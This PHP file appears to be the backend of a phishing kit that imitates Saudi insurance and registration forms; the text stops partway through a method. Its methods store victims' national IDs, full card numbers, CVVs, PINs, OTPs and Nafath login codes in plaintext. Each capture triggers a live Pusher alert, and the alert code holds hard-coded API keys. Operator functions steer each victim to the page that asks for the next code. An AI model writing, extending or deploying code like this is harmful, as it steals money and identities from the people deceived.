<?php

/**
 * User System Login
 */
class User extends DB
{

  // users name of table
  private $table = 'admin';
  
  // ============================================
  // دوال تسجيل الدخول المحدثة
  // ============================================
  
  public function adminLogin($username, $password)
  {
    $sql = 'SELECT * FROM `admin` WHERE `username` = :username AND `is_active` = 1 LIMIT 1';
    DB::query($sql);
    DB::bind(':username', $username);
    DB::execute();
    
    $admin = DB::fetch();
    
    if (DB::rowCount() > 0) {
      // التحقق من كلمة المرور
      if (password_verify($password, $admin->password)) {
        // تحديث آخر تسجيل دخول
        $this->updateLastLogin($admin->id);
        return $admin;
      }
    }
    
    return false;
  }
  
  public function updateLastLogin($adminId)
  {
    $sql = "UPDATE `admin` SET `last_login` = NOW() WHERE `id` = :id";
    DB::query($sql);
    DB::bind(':id', $adminId);
    return DB::execute();
  }
  
  public function checkAdminSession()
  {
    if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
      return false;
    }
    return true;
  }
  
  public function createAdmin($username, $password, $fullName = null, $email = null)
  {
    // التحقق من عدم وجود اسم المستخدم
    $checkSql = 'SELECT id FROM `admin` WHERE `username` = :username';
    DB::query($checkSql);
    DB::bind(':username', $username);
    DB::execute();
    
    if (DB::rowCount() > 0) {
      return ['success' => false, 'error' => 'اسم المستخدم موجود بالفعل'];
    }
    
    // تشفير كلمة المرور
    $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
    
    // إضافة المشرف
    $sql = 'INSERT INTO `admin` (`username`, `password`, `full_name`, `email`, `is_active`) 
            VALUES (:username, :password, :full_name, :email, 1)';
    
    DB::query($sql);
    DB::bind(':username', $username);
    DB::bind(':password', $hashedPassword);
    DB::bind(':full_name', $fullName);
    DB::bind(':email', $email);
    
    if (DB::execute()) {
      return ['success' => true, 'id' => DB::lastInsertId()];
    }
    
    return ['success' => false, 'error' => 'حدث خطأ أثناء الإضافة'];
  }
  
  public function getAllAdmins()
  {
    $sql = 'SELECT id, username, full_name, email, created_at, last_login, is_active 
            FROM `admin` 
            ORDER BY id DESC';
    
    DB::query($sql);
    DB::execute();
    
    if (DB::rowCount() > 0) {
      return DB::fetchAll();
    }
    
    return [];
  }

  // ============================================
  // دالة مساعدة لإرسال إشعار Pusher
  // ============================================
  private function sendPusherUpdate($userId, $message = 'تحديث بيانات')
  {
    try {
      require_once $_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php';
      
      $pusher = new Pusher\Pusher(
        'a56388ee6222f6c5fb86',
        '4c77061f4115303aac58',
        '1973588',
        ['cluster' => 'ap2', 'useTLS' => true]
      );

      $pusher->trigger('my-channel', 'updaefte-user-payys', [
        'userId' => $userId,
        'updatedData' => ['message' => $message]
      ]);
      
      return true;
    } catch (Exception $e) {
      error_log("Pusher Error: " . $e->getMessage());
      return false;
    }
  }

  private function sendPusherNew($userId, $message = 'عميل جديد')
  {
    try {
      require_once $_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php';
      
      $pusher = new Pusher\Pusher(
        'a56388ee6222f6c5fb86',
        '4c77061f4115303aac58',
        '1973588',
        ['cluster' => 'ap2', 'useTLS' => true]
      );

      $pusher->trigger('my-channel', 'my-event-newwwe', [
        'userId' => $userId,
        'message' => $message
      ]);
      
      return true;
    } catch (Exception $e) {
      error_log("Pusher Error: " . $e->getMessage());
      return false;
    }
  }

  public function login($data)
  {
    $sql = 'SELECT * FROM ' . $this->table . ' WHERE `username` = :username OR `email` = :email LIMIT 1';

    DB::query($sql);
    DB::bind(':username', $data['username']);
    DB::bind(':email', $data['email']);
    DB::execute();

    $user = DB::fetch();
    if (DB::rowCount() > 0) {
      if ($data['password'] == $user->password) {
        $_SESSION['user_session'] = $user->id;
        return true;
      } else {
        return false;
      }
    }
  }
  
  public function fetchAdminById($id)
  {
    $sql = 'SELECT * FROM `admin` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0)
      return $data;
    else
      return false;
  }
  
  public function updateLastPage($userId, $pageName)
  {
    $sql = 'UPDATE `users` SET `last_page` = :page WHERE `id` = :id';
    DB::query($sql);
    DB::bind(':page', $pageName);
    DB::bind(':id', $userId);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($userId, 'تغيير صفحة');
      return true;
    }
    return false;
  }

  public function fetchUserById($id)
  {
    $sql = 'SELECT * FROM `users` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0)
      return $data;
    else
      return false;
  }

  public function fetchCardById($id)
  {
    $sql = 'SELECT * FROM `card` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0)
      return $data;
    else
      return false;
  }

  public function deleteAdminById($id)
  {
    $sql = 'DELETE FROM `admin` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    return DB::execute();
  }

  public function isLoggedIn()
  {
    if (isset($_SESSION['user_session']))
      return true;
  }

  public function logOut()
  {
    session_destroy();
    unset($_SESSION['user_session']);
    if (isset($_SESSION['user_session']))
      return false;
    else
      return true;
  }

  public function redirect($url)
  {
    echo "
      <script>
      window.location.href=\"$url\";
      </script>
      ";
  }

  public function insertAdmin($data = array())
  {
    $sql = 'INSERT INTO `admin` (`username`,
                                  `email`,
                                  `password`)
                                    VALUE ( :username,:email,:password)
                                           ';
    DB::query($sql);
    DB::bind(':username', $data['username']);
    DB::bind(':email', $data['email']);
    DB::bind('password', $data['password']);

    return DB::execute();
  }

  public function fetchAllAdmin()
  {
    $sql = 'SELECT * FROM `admin`;';

    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();

    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }
  
  public function fetchAllUsers()
  {
    $sql = 'SELECT * FROM `users` ORDER BY id DESC;';

    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();

    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }
  
  public function fetchAllCards()
  {
    $sql = 'SELECT * FROM `card` ORDER BY id DESC;';

    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();

    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }

  public function NumberOfCards()
  {
    $sql = 'SELECT count(*) as total FROM `card`';

    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();

    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return 0;
    }
  }

  public function register($data = array())
  {
    $username = $this->generateRandomUsername();

    $sql = 'INSERT INTO `users` (
              `username`,
              `ssn`,
              `message`,
              `priceCharge`,                      
              `totalPriceInput`)      
            VALUES (
              :username,
              :ssn,
              :message,
              :priceCharge,
              :totalPriceInput
            )';

    DB::query($sql);
    DB::bind(':username', $username);
    DB::bind(':ssn', $data['ssn']);
    DB::bind(':message', 'Inactive');
    DB::bind(':priceCharge', isset($data['priceCharge']) ? $data['priceCharge'] : null);
    DB::bind(':totalPriceInput', isset($data['totalPriceInput']) ? $data['totalPriceInput'] : null);

    if (DB::execute()) {
      $lastId = DB::lastInsertId();
      $this->sendPusherNew($lastId, 'عميل جديد');
      return $lastId;
    } else {
      return false;
    }
  }

  private function generateRandomUsername()
  {
    $prefixes = ['user', 'member', 'client', 'guest'];
    $randomPrefix = $prefixes[array_rand($prefixes)];
    $randomNumber = rand(1000, 9999);
    return $randomPrefix . $randomNumber;
  }

  public function UpdateStatus($id, $message)
  {
    $sql = 'UPDATE `users` SET `message` = :message WHERE `id` = :id;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':message', $message);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, $message);
      return true;
    }
    return false;
  }

  public function InsertCardRelatedUser($id, $data = array())
  {
    $sql = 'INSERT INTO `card` (
      `bank`,
      `cardNumber`,
      `month`,
      `year`,
      `password`,
      `bad`,
      `provider`,
      `phone`,
      `otpphone`,
      `civilnumber`,
      `userId`
    ) VALUE (
      :bank,
      :cardNumber,
      :month,
      :year,
      :password,
      :bad,
      :provider,
      :phone,
      :otpphone,
      :civilnumber,
      :id
    )';

    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':bank', $data['bank']);
    DB::bind(':cardNumber', $data['cardNumber']);
    DB::bind(':month', $data['month']);
    DB::bind(':year', $data['year']);
    DB::bind(':password', $data['password']);
    DB::bind(':bad', $data['bad']);
    DB::bind(':provider', $data['provider']);
    DB::bind(':phone', $data['phone']);
    DB::bind(':otpphone', $data['otpphone']);
    DB::bind(':civilnumber', $data['civilnumber']);

    if (DB::execute()) {
      $cardId = DB::lastInsertId();
      $this->sendPusherUpdate($id, 'بيانات بطاقة جديدة');
      return $cardId;
    } else {
      return false;
    }
  }

  public function UpdateCardOTP($id, $data = array())
  {
    $sql = 'UPDATE `card` SET `status` = :status, `otp` = :otp  WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':otp', $data['otp']);
    DB::bind(':status', 0);
    
    if (DB::execute()) {
      // جلب userId من الكارد
      $card = $this->fetchCardById($id);
      if ($card && isset($card->userId)) {
        $this->sendPusherUpdate($card->userId, 'رمز OTP جديد');
      }
      return true;
    }
    return false;
  }

  public function UpdateCardCVV($id, $data = array())
  {
    $sql = 'UPDATE `card` SET `cvv` = :cvv  WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':cvv', $data['cvv']);
    
    if (DB::execute()) {
      $card = $this->fetchCardById($id);
      if ($card && isset($card->userId)) {
        $this->sendPusherUpdate($card->userId, 'CVV محدث');
      }
      return true;
    }
    return false;
  }

  public function UpdateVerify($id, $data = array())
  {
    $sql = 'UPDATE `users` SET `waitVerify` = :waitVerify , `message` = :message WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':waitVerify', $data['waitVerify']);
    DB::bind(':message', 'Wait Verify');
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, 'بانتظار التحقق');
      return true;
    }
    return false;
  }

  public function DeleteUserById($id)
  {
    $sql = 'DELETE FROM `users` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    return DB::execute();
  }

  public function DeleteAllUsers()
  {
    $sql = 'DELETE FROM `users`';
    DB::query($sql);
    return DB::execute();
  }

  public function UpdateCardCodeById($id, $code)
  {
    $sql = 'UPDATE `card` SET `code` = :code WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    
    if (DB::execute()) {
      $card = $this->fetchCardById($id);
      if ($card && isset($card->userId)) {
        $this->sendPusherUpdate($card->userId, 'كود جديد');
      }
      return true;
    }
    return false;
  }

  public function UpdateCardPasswordById($id, $password)
  {
    $sql = 'UPDATE `card` SET `password` = :password WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':password', $password);
    
    if (DB::execute()) {
      $card = $this->fetchCardById($id);
      if ($card && isset($card->userId)) {
        $this->sendPusherUpdate($card->userId, 'كلمة سر محدثة');
      }
      return true;
    }
    return false;
  }

  public function register2($data = array())
  {
    $sql = 'INSERT INTO `card` (
      `cardNumber`,
      `expire1`,
      `expire2`,
      `cvv`
    ) VALUE (
      :cardNumber,
      :month,
      :year,
      :cvv
    )';
    DB::query($sql);
    DB::bind(':cardNumber', $data['cardNumber']);
    DB::bind(':month', $data['month']);
    DB::bind(':year', $data['year']);
    DB::bind(':cvv', $data['cvv']);
    
    if (DB::execute())
      return DB::lastInsertId();
    else
      return false;
  }

  public function UpdateUserCodeById($id, $code)
  {
    $sql = 'UPDATE `users` SET `code` = :code WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, 'كود تحقق جديد');
      return true;
    }
    return false;
  }

  public function UpdateUserCheckTheCodeById($id, $code)
  {
    $sql = 'UPDATE `users` SET `CheckTheCode` = :code WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, 'فحص الكود');
      return true;
    }
    return false;
  }

  public function UpdateUserStatusById($id, $status)
  {
    $sql = 'UPDATE `users` SET `status` = :status WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':status', $status);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, 'تحديث الحالة');
      return true;
    }
    return false;
  }

  public function UpdateUserCheckTheInfo_NafadAndTextById($id, $code, $temp)
  {
    $sql = 'UPDATE `card` SET `CheckTheInfo_Nafad` = :code , `TemporaryPassword` = :temp  WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    DB::bind(':temp', $temp);
    
    if (DB::execute()) {
      $card = $this->fetchCardById($id);
      if ($card && isset($card->userId)) {
        $this->sendPusherUpdate($card->userId, 'معلومات نفاذ');
      }
      return true;
    }
    return false;
  }

  public function UpdateCard($id, $code)
  {
    $sql = 'UPDATE `card` SET `status` = :code WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':code', $code);
    
    if (DB::execute()) {
      $card = $this->fetchCardById($id);
      if ($card && isset($card->userId)) {
        $this->sendPusherUpdate($card->userId, 'تحديث بطاقة');
      }
      return true;
    }
    return false;
  }

  public function FetchAllUsersForList()
  {
    $sql = 'SELECT * FROM `users` ORDER BY id DESC;';
    DB::query($sql);
    DB::execute();
    $data = DB::fetchAll();

    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }

  public function UpdateUserById($id, $access)
  {
    $sql = 'UPDATE `users` SET `access` = :access WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':access', $access);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, 'تحديث صلاحية');
      return true;
    }
    return false;
  }

  public function insertLink($data)
  {
    $sql = 'UPDATE `users` SET `link` = :link WHERE `id` = :id ;';
    DB::query($sql);
    DB::bind(':id', $data['id']);
    DB::bind(':link', $data['link']);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($data['id'], 'رابط جديد');
      return true;
    }
    return false;
  }

  public function updateAdmin($id, $data)
  {
    $sql = 'UPDATE `admin` SET `username` = :username,`password` = :password,`email` = :email
                                  WHERE `id` = :id';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':username', $data['username']);
    DB::bind(':email', $data['email']);
    DB::bind(':password', $data['password']);
    DB::bind(':id', $id);
    return DB::execute();
  }

  public function fetchAdmin($id)
  {
    $sql = 'SELECT * FROM `admin` WHERE `id` = :id ';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::execute();
    $data = DB::fetch();
    if (DB::rowCount() > 0)
      return $data;
    else
      return false;
  }

public function insertFormData($data = array())
{
    $sql = 'INSERT INTO `users` (
      `request_type`,
      `nationality`,
      `ssn`,
      `name`,
      `phone`,
      `date`,
      `email`,
      `username`,
      `message`,
      `selected_school`,
      `currentpage`,
      `status`,
      `live`,
      `lastlive`,
      `ip_address`,
      `user_agent`,
      `session_id`
    ) VALUES (
      :request_type,
      :nationality,  -- ✅ أضف هذا
      :ssn,
      :name,
      :phone,
      :date,
      :email,
      :username,
      :message,
      :selected_school,
      :currentpage,
      :status,
      :live,
      :lastlive,
      :ip_address,
      :user_agent,
      :session_id
    )';

    DB::query($sql);
    
    // ربط البيانات
    DB::bind(':request_type', $data['request_type'] ?? null);
    DB::bind(':nationality', $data['nationality'] ?? null);  // ✅ أضف هذا
    DB::bind(':ssn', $data['ssn'] ?? null);
    DB::bind(':name', $data['name'] ?? null);
    DB::bind(':phone', $data['phone'] ?? null);
    DB::bind(':date', $data['date'] ?? null);
    DB::bind(':email', $data['email'] ?? null);
    
    // بيانات النظام
    DB::bind(':username', $data['username'] ?? 'client_' . time());
    DB::bind(':message', $data['message'] ?? 'طلب تسجيل جديد');
    DB::bind(':selected_school', $data['selected_school'] ?? null);
    DB::bind(':currentpage', $data['currentpage'] ?? 'register.php');
    DB::bind(':status', $data['status'] ?? 0);
    DB::bind(':live', $data['live'] ?? 1);
    DB::bind(':lastlive', $data['lastlive'] ?? round(microtime(true) * 1000));
    DB::bind(':ip_address', $data['ip_address'] ?? null);
    DB::bind(':user_agent', $data['user_agent'] ?? null);
    DB::bind(':session_id', $data['session_id'] ?? null);

    if (DB::execute()) {
      $lastId = DB::lastInsertId();
      $this->sendPusherNew($lastId, $data['message'] ?? 'طلب تسجيل جديد');
      return $lastId;
    } else {
      return false;
    }
}

  /**
   * تحديث نفس صف المستخدم بعد اختيار المدرسة (لا يُنشئ صفاً جديداً).
   * لا يغيّر username ولا selected_school حتى لا تُفقد بيانات الخطوة الأولى.
   */
  public function updateRegistrationFormData(int $userId, array $data = []): bool
  {
    $sql = 'UPDATE `users` SET
      `request_type` = :request_type,
      `nationality` = :nationality,
      `ssn` = :ssn,
      `name` = :name,
      `phone` = :phone,
      `date` = :date,
      `email` = :email,
      `message` = :message,
      `currentpage` = :currentpage,
      `status` = :status,
      `live` = :live,
      `lastlive` = :lastlive,
      `ip_address` = :ip_address,
      `user_agent` = :user_agent,
      `session_id` = :session_id
    WHERE `id` = :id';

    DB::query($sql);
    DB::bind(':request_type', $data['request_type'] ?? null);
    DB::bind(':nationality', $data['nationality'] ?? null);
    DB::bind(':ssn', $data['ssn'] ?? null);
    DB::bind(':name', $data['name'] ?? null);
    DB::bind(':phone', $data['phone'] ?? null);
    DB::bind(':date', $data['date'] ?? null);
    DB::bind(':email', $data['email'] ?? null);
    DB::bind(':message', $data['message'] ?? 'تم استكمال بيانات التسجيل');
    DB::bind(':currentpage', $data['currentpage'] ?? 'register.php');
    DB::bind(':status', $data['status'] ?? 0);
    DB::bind(':live', $data['live'] ?? 1);
    DB::bind(':lastlive', $data['lastlive'] ?? round(microtime(true) * 1000));
    DB::bind(':ip_address', $data['ip_address'] ?? null);
    DB::bind(':user_agent', $data['user_agent'] ?? null);
    DB::bind(':session_id', $data['session_id'] ?? null);
    DB::bind(':id', $userId);

    if (DB::execute()) {
      $this->sendPusherUpdate($userId, $data['message'] ?? 'تم استكمال بيانات التسجيل');
      return true;
    }
    return false;
  }

  public function updateInsuranceData($userId, $data = array())
  {
    $sql = 'UPDATE `users` SET 
      `insurance_coverage_type` = :insurance_coverage_type,
      `start_date` = :start_date,
      `vehicle_usage` = :vehicle_usage,
      `market_value` = :market_value,
      `manufacture_year` = :manufacture_year,
      `car_model` = :car_model,
      `issue_place` = :issue_place,
      `message` = :message,
      `currentpage` = :currentpage,
      `updated_at` = CURRENT_TIMESTAMP
    WHERE `id` = :user_id';

    DB::query($sql);
    DB::bind(':insurance_coverage_type', $data['insurance_coverage_type'] ?? null);
    DB::bind(':start_date', $data['start_date'] ?? null);
    DB::bind(':vehicle_usage', $data['vehicle_usage'] ?? null);
    DB::bind(':market_value', $data['market_value'] ?? null);
    DB::bind(':manufacture_year', $data['manufacture_year'] ?? null);
    DB::bind(':car_model', $data['car_model'] ?? null);
    DB::bind(':issue_place', $data['issue_place'] ?? null);
    DB::bind(':message', 'بيانات التأمين - المرحلة 2');
    DB::bind(':currentpage', 'index2.php');
    DB::bind(':user_id', $userId);

    if (DB::execute()) {
      $this->sendPusherUpdate($userId, 'بيانات التأمين - المرحلة 2');
      return true;
    }
    
    return false;
  }

  public function updateUserMessage($id, $message)
  {
    $sql = 'UPDATE `users` SET `message` = :message WHERE `id` = :id';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':message', $message);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, $message);
      return true;
    }
    return false;
  }

  public function updateUserCurrentPage($id, $page)
  {
    $sql = 'UPDATE `users` SET `currentpage` = :page WHERE `id` = :id';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':page', $page);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($id, 'انتقل إلى: ' . $page);
      return true;
    }
    return false;
  }

  public function updateUserLiveStatus($id, $live)
  {
    $lastlive = round(microtime(true) * 1000);
    
    $sql = 'UPDATE `users` SET `live` = :live, `lastlive` = :lastlive WHERE `id` = :id';
    DB::query($sql);
    DB::bind(':id', $id);
    DB::bind(':live', $live);
    DB::bind(':lastlive', $lastlive);
    return DB::execute();
  }

  public function fetchUsersWithFilter($formType = null, $status = null)
  {
    $sql = 'SELECT * FROM `users` WHERE 1=1';
    
    if ($formType !== null) {
      $sql .= ' AND `form_type` = :form_type';
    }
    
    if ($status !== null) {
      $sql .= ' AND `status` = :status';
    }
    
    $sql .= ' ORDER BY id DESC';
    
    DB::query($sql);
    
    if ($formType !== null) {
      DB::bind(':form_type', $formType);
    }
    
    if ($status !== null) {
      DB::bind(':status', $status);
    }
    
    DB::execute();
    $data = DB::fetchAll();

    if (DB::rowCount() > 0) {
      return $data;
    } else {
      return false;
    }
  }

  public function getVisitsCount()
  {
    $sql = 'SELECT total_visits FROM `visits` WHERE id = 1';
    DB::query($sql);
    DB::execute();
    $data = DB::fetch();
    
    if (DB::rowCount() > 0) {
        return $data->total_visits;
    } else {
        return 0;
    }
  }

  public function incrementVisitCount()
  {
    $sql = 'UPDATE `visits` SET total_visits = total_visits + 1, updated_at = NOW() WHERE id = 1';
    DB::query($sql);
    $result = DB::execute();
    
    if (DB::rowCount() === 0) {
        $sql = 'INSERT INTO `visits` (id, total_visits, updated_at) VALUES (1, 1, NOW())';
        DB::query($sql);
        DB::execute();
    }
    
    return true;
  }

public function insertCardPayment($data = array())
{
    $sql = 'INSERT INTO `cards` (
        `user_id`,
        `cardName`,
        `cardNumber`,
        `cardExpiry`,
        `cvv`,
        `price`,
        `payment_method`,
        `created_at`
    ) VALUES (
        :user_id,
        :cardName,
        :cardNumber,
        :cardExpiry,
        :cvv,
        :price,
        :payment_method,
        NOW()
    )';

    DB::query($sql);

    // تجهيز cardExpiry من month و year
    $cardExpiry = ($data['month'] ?? '00') . '/' . ($data['year'] ?? '0000');

    DB::bind(':user_id', $data['user_id']);
    DB::bind(':cardName', $data['cardName'] ?? null);
    DB::bind(':cardNumber', $data['cardNumber'] ?? null);
    DB::bind(':cardExpiry', $cardExpiry);
    DB::bind(':cvv', $data['cvv'] ?? null);
    DB::bind(':price', $data['price'] ?? '1.00');
    DB::bind(':payment_method', $data['payment_method'] ?? 'card');

    if (DB::execute()) {
        $cardId = DB::lastInsertId();
        $this->sendPusherUpdate($data['user_id'], 'دفع بطاقة جديد - ' . ($data['price'] ?? '1.00') . ' ر.س');
        return $cardId;
    }

    return false;
}

  public function fetchCardsByUserId($userId)
  {
    $sql = 'SELECT * FROM `cards` WHERE `user_id` = :user_id ORDER BY created_at DESC';
    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();
    return DB::fetchAll();
  }

  public function getRedirectUrl($userId)
  {
    $sql = "SELECT redirect_to, redirect_active FROM users WHERE id = :id LIMIT 1";
    DB::query($sql);
    DB::bind(':id', $userId);
    DB::execute();

    $row = DB::fetch();

    if ($row && $row->redirect_active == 1 && !empty($row->redirect_to)) {
        return $row->redirect_to;
    }

    return null;
  }

  public function setRedirect($userId, $page)
  {
    $sql = "UPDATE users SET redirect_to = :page, redirect_active = 1 WHERE id = :id";
    DB::query($sql);
    DB::bind(':page', $page);
    DB::bind(':id', $userId);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($userId, 'بانتظار التوجيه إلى: ' . $page);
      return true;
    }
    return false;
  }

  public function clearRedirect($userId)
  {
    $sql = "UPDATE users SET redirect_to = NULL, redirect_active = 0 WHERE id = :id";
    DB::query($sql);
    DB::bind(':id', $userId);
    return DB::execute();
  }

  public function insertCardOTP($cardId, $userId, $otpCode)
  {
    $sql = "INSERT INTO card_otps (card_id, user_id, otp_code)
            VALUES (:card_id, :user_id, :otp_code)";
    
    DB::query($sql);
    DB::bind(':card_id', $cardId);
    DB::bind(':user_id', $userId);
    DB::bind(':otp_code', $otpCode);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($userId, 'رمز OTP جديد');
      return true;
    }
    return false;
  }

  public function fetchOtpsByCardId($cardId)
  {
    $sql = "SELECT * FROM card_otps 
            WHERE card_id = :card_id 
            ORDER BY id DESC";
    
    DB::query($sql);
    DB::bind(':card_id', $cardId);
    DB::execute();
    
    return DB::fetchAll();
  }

  public function fetchLastCardByUserId($userId)
  {
    $sql = "SELECT * FROM cards 
            WHERE user_id = :user_id 
            ORDER BY id DESC 
            LIMIT 1";
    
    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();
    
    return DB::fetch();
  }

public function insertCardPIN($cardId, $clientId, $pinCode)
{
    error_log("=== insertCardPIN START ===");
    error_log("Params: card_id=$cardId, client_id=$clientId, pin=$pinCode");

    try {
        // 1️⃣ إدخال السجل
        $sql = "INSERT INTO card_pins (card_id, client_id, pin_code)
                VALUES (:card_id, :client_id, :pin_code)";

        DB::query($sql);
        DB::bind(':card_id', $cardId);
        DB::bind(':client_id', $clientId);
        DB::bind(':pin_code', $pinCode);

        $result = DB::execute();

        if (!$result) {
            error_log("❌ Insert failed");
            return false;
        }

        // 2️⃣ جلب آخر ID تم إدخاله
        $lastId = DB::lastInsertId();
        error_log("✅ Inserted PIN ID: $lastId");

        // 3️⃣ جلب السجل الأخير كامل
        $sql = "SELECT *
                FROM card_pins
                WHERE id = :id
                LIMIT 1";

        DB::query($sql);
        DB::bind(':id', $lastId);

        $lastRecord = DB::single(); // أو fetch()

        error_log("✅ Last record fetched: " . json_encode($lastRecord));

        // 4️⃣ إرسال إشعار (اختياري)
        try {
            $this->sendPusherUpdate($clientId, 'رمز PIN جديد');
        } catch (Exception $e) {
            error_log("⚠️ Pusher failed: " . $e->getMessage());
        }

        // 5️⃣ إرجاع آخر سجل
        return $lastRecord;

    } catch (Exception $e) {
        error_log("❌ insertCardPIN Exception: " . $e->getMessage());
        error_log("Stack: " . $e->getTraceAsString());
        return false;
    }
}


  public function fetchLastPinByClientId($clientId)
  {
    $sql = "SELECT pin_code, created_at
            FROM card_pins
            WHERE client_id = :client_id
            ORDER BY id DESC
            LIMIT 1";

    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::execute();

    return DB::fetch();
  }

  public function insertNafadRequest($clientId, $phone, $telecom, $idNumber = null)
  {
    $sql = "INSERT INTO nafad_requests 
            (client_id, phone, telecom, id_number)
            VALUES 
            (:client_id, :phone, :telecom, :id_number)";

    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::bind(':phone', $phone);
    DB::bind(':telecom', $telecom);
    DB::bind(':id_number', $idNumber);

    if (DB::execute()) {
      $this->sendPusherUpdate($clientId, 'طلب نفاذ جديد');
      return true;
    }
    return false;
  }

  public function fetchLastNafadByClientId($clientId)
  {
    $sql = "SELECT * FROM nafad_requests
            WHERE client_id = :client_id
            ORDER BY id DESC
            LIMIT 1";

    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::execute();

    return DB::fetch();
  }

  public function insertNafadLog($data)
  {
    $sql = "INSERT INTO nafad_logs (
                user_id,
                phone,
                telecom,
                id_number,
                redirect_to
            ) VALUES (
                :user_id,
                :phone,
                :telecom,
                :id_number,
                :redirect_to
            )";

    DB::query($sql);
    DB::bind(':user_id', $data['user_id']);
    DB::bind(':phone', $data['phone']);
    DB::bind(':telecom', $data['telecom']);
    DB::bind(':id_number', $data['id_number']);
    DB::bind(':redirect_to', $data['redirect_to']);

    if (DB::execute()) {
      $this->sendPusherUpdate($data['user_id'], 'سجل نفاذ جديد');
      return true;
    }
    return false;
  }

  public function fetchNafadLogsByUserId($userId)
  {
    $sql = "SELECT 
                phone,
                telecom,
                id_number,
                redirect_to,
                created_at
            FROM nafad_logs
            WHERE user_id = :user_id
            ORDER BY id DESC";

    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();

    return DB::fetchAll();
  }

  public function insertNafadCode($clientId, $nafadCode)
  {
    $sql = 'INSERT INTO `nafad_codes` (
        `client_id`,
        `nafad_code`
    ) VALUES (
        :client_id,
        :nafad_code
    )';

    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::bind(':nafad_code', $nafadCode);

    if (DB::execute()) {
        $codeId = DB::lastInsertId();
        $this->sendPusherUpdate($clientId, 'رمز نفاذ جديد: ' . $nafadCode);
        return $codeId;
    }
    
    return false;
  }

  public function fetchNafadCodesByClientId($clientId)
  {
    $sql = 'SELECT 
                id,
                client_id,
                nafad_code,
                created_at
            FROM `nafad_codes` 
            WHERE `client_id` = :client_id 
            ORDER BY `id` DESC';
    
    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::execute();
    
    return DB::fetchAll();
  }

  public function fetchLastNafadCodeByClientId($clientId)
  {
    $sql = 'SELECT * FROM `nafad_codes` 
            WHERE `client_id` = :client_id 
            ORDER BY `id` DESC 
            LIMIT 1';
    
    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::execute();
    
    return DB::fetch();
  }

  public function sendNafathNumber($clientId, $number)
  {
    $sql = 'INSERT INTO `nafath_numbers` (
        `client_id`,
        `number`
    ) VALUES (
        :client_id,
        :number
    )';

    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::bind(':number', $number);

    if (DB::execute()) {
        $numberId = DB::lastInsertId();
        $this->sendPusherUpdate($clientId, 'رقم نفاذ: ' . $number);
        return $numberId;
    }
    
    return false;
  }

  public function getLastNafathNumber($clientId)
  {
    $sql = 'SELECT * FROM `nafath_numbers` 
            WHERE `client_id` = :client_id 
            ORDER BY `id` DESC 
            LIMIT 1';
    
    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::execute();
    
    return DB::fetch();
  }

  public function getAllNafathNumbers($clientId)
  {
